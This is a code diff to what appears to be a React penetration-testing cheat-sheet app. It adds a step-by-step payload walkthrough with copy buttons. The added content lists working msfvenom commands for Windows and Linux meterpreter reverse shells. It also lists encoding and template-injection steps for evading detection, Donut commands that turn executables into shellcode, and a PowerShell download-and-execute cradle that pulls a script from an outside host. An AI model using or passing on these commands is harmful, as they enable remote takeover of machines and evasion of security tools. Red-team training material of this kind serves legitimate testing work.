@@ -19,6 +19,56 @@ const PayloadGeneration = () => {
 
   const sections = [
     {
+      id: 'walkthrough',
+      title: 'Guided Payload Generation Walkthrough',
+      content: [
+        {
+          type: 'markdown',
+          value: 'Follow this step-by-step chain for generating and obfuscating payloads. Expand each step for details and commands.'
+        },
+        {
+          type: 'step',
+          title: '1. Generate a Basic Payload',
+          description: 'Create a simple reverse shell payload for Windows or Linux.',
+          commands: [
+            { value: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe', description: 'Windows reverse shell' },
+            { value: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf', description: 'Linux reverse shell' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '2. Obfuscate the Payload',
+          description: 'Use encoders and custom templates to evade detection.',
+          commands: [
+            { value: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe', description: 'Encoded payload' },
+            { value: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -x /path/to/legit.exe -f exe -o malicious.exe', description: 'Custom template payload' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '3. Generate Shellcode',
+          description: 'Create shellcode from PE or .NET assemblies using Donut.',
+          commands: [
+            { value: 'donut -a 2 -b 1 -f 1 -o payload.bin shell.exe', description: 'Shellcode from PE' },
+            { value: 'donut -a 2 -b 1 -f 7 -o payload.bin Rubeus.exe', description: 'Shellcode from .NET assembly' }
+          ]
+        },
+        {
+          type: 'step',
+          title: '4. Advanced Obfuscation',
+          description: 'Obfuscate PowerShell or macro payloads for evasion.',
+          commands: [
+            { value: '$cmd = "iex" + "(" + "New-Object Net.WebClient).DownloadString(\'http://10.0.0.1/script.ps1\')"', description: 'PowerShell string concatenation' },
+            { value: 'Sub AutoOpen() ...', description: 'VBA macro loader' }
+          ]
+        },
+        {
+          type: 'markdown',
+          value: '**Tip:** After each step, test your payloads in a safe environment and document your results!'
+        }
+      ]
+    },
+    {
       id: 'msfvenom',
       title: 'Msfvenom Payloads',
       content: [
@@ -172,36 +222,67 @@ End Sub
             >
               {expandedSection === section.id && (
                 <div className="content-inner">
-                  {section.content.map((item, index) => (
-                    <div key={index} className="content-item">
-                      {item.type === 'command' ? (
-                        <div className="command-item">
-                          <div className="command-header">
-                            <code>{item.value}</code>
+                  {section.content.map((item, index) => {
+                    if (item.type === 'step') {
+                      return (
+                        <div key={index} className="content-item walkthrough-step">
+                          <div className="step-header">
+                            <strong>{item.title}</strong>
+                          </div>
+                          <div className="step-description">{item.description}</div>
+                          <div className="step-commands">
+                            {item.commands.map((cmd, i) => (
+                              <div key={i} className="command-item">
+                                <div className="command-header">
+                                  <code>{cmd.value}</code>
+                                  <button
+                                    onClick={() => handleCopy(cmd.value)}
+                                    className="copy-button small"
+                                  >
+                                    Copy
+                                  </button>
+                                </div>
+                                <p className="command-description">{cmd.description}</p>
+                              </div>
+                            ))}
+                          </div>
+                        </div>
+                      );
+                    } else if (item.type === 'command') {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="command-item">
+                            <div className="command-header">
+                              <code>{item.value}</code>
+                              <button
+                                onClick={() => handleCopy(item.value)}
+                                className="copy-button small"
+                              >
+                                Copy
+                              </button>
+                            </div>
+                            <p className="command-description">{item.description}</p>
+                          </div>
+                        </div>
+                      );
+                    } else {
+                      return (
+                        <div key={index} className="content-item">
+                          <div className="markdown-content">
+                            <ReactMarkdown>
+                              {item.value}
+                            </ReactMarkdown>
                             <button
-                              onClick={() => handleCopy(item.value)}
-                              className="copy-button small"
+                              onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
+                              className="copy-button"
                             >
-                              Copy
+                              Copy All
                             </button>
                           </div>
-                          <p className="command-description">{item.description}</p>
                         </div>
-                      ) : (
-                        <div className="markdown-content">
-                          <ReactMarkdown>
-                            {item.value}
-                          </ReactMarkdown>
-                          <button
-                            onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
-                            className="copy-button"
-                          >
-                            Copy All
-                          </button>
-                        </div>
-                      )}
-                    </div>
-                  ))}
+                      );
+                    }
+                  })}
                 </div>
               )}
             </motion.div>
